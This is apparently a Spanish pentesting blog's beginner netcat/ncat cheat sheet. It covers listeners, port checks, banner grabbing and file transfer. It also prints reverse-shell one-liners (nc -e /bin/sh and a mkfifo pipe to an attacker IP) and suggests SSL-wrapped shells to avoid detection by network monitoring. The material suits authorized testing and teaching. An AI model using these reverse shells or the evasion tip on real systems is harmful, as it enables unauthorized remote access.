---
title: "Netcat: los comandos que uso de verdad, sin memorizar la lista entera"
description: "Reverse shells, listeners, transferencia de archivos y escaneo básico con netcat/ncat — lo que realmente repito en cada pentest, no la lista completa de flags que nadie usa."
slug: "netcat-cheatsheet"
category: "Herramientas"
tags: ["netcat", "ncat", "reverse shell", "pentesting"]
date: "2026-09-16"
level: "Principiante"
---

## Por qué netcat sigue siendo lo primero que abro

Con tantas herramientas más "completas" disponibles, netcat sigue siendo lo que uso para las cosas más básicas: levantar un listener rápido, comprobar si un puerto está realmente abierto más allá de lo que dice Nmap, o mover un archivo pequeño sin montar nada más pesado. No necesita configuración, y case siempre está disponible en cualquier sistema Linux.

## El listener básico

```bash
nc -lvnp 4444
```

`-l` listen, `-v` verbose (para ver qué pasa), `-n` sin resolución DNS (más rápido), `-p` puerto. Esta es la combinación que uso literalmente en cada reverse shell que recibo.

## Reverse shell desde el objetivo

Una vez tienes el listener corriendo, en el objetivo (con autorización, claro):

```bash
nc -e /bin/sh <tu-ip> 4444
```

No todas las versiones de netcat soportan `-e` (por razones de seguridad, se quita en muchas distribuciones por defecto). Si falla, la alternativa con named pipe:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <tu-ip> 4444 >/tmp/f
```

## Comprobar si un puerto está realmente abierto

Nmap a veces marca algo como `filtered` cuando en realidad no está seguro. Una conexión directa con netcat da una respuesta más clara:

```bash
nc -vz objetivo 80
nc -vz objetivo 1-1000
```

`-z` hace un escaneo sin enviar datos, solo comprobando si la conexión se establece — más lento que Nmap para rangos grandes, pero útil para confirmar un puerto específico cuando dudo del resultado.

## Transferencia de archivos sin montar nada más

En el receptor:

```bash
nc -lvnp 4444 > archivo_recibido.txt
```

En el emisor:

```bash
nc <ip-receptor> 4444 < archivo_a_enviar.txt
```

Sin cifrado, sin verificación de integridad — para mover algo pequeño en un entorno de laboratorio o dentro de una red ya comprometida es rápido y no depende de tener un servidor HTTP montado.

## Banner grabbing rápido

```bash
nc objetivo 22
```

Conectar directamente a un puerto y ver qué banner devuelve el servicio, sin necesitar Nmap con `-sV` para algo tan simple como confirmar la versión de un servicio SSH o FTP.

## ncat: la versión con más opciones cuando netcat se queda corto

`ncat` (parte del paquete de Nmap) añade SSL y algunas opciones que netcat clásico no tiene:

```bash
ncat --ssl -lvnp 4444
```

Uso ncat específicamente cuando necesito que la conexión vaya cifrada — por ejemplo, para que un reverse shell no sea trivialmente visible en texto plano si hay algo monitorizando el tráfico de la red.

## Lo que no intento hacer con netcat

Nada que requiera interacción compleja o manejo robusto de sesión — para eso Metasploit con Meterpreter o una shell más completa dan mucho más control (background de sesión, migración de proceso, módulos post-explotación). Netcat es la navaja básica, no la herramienta para todo.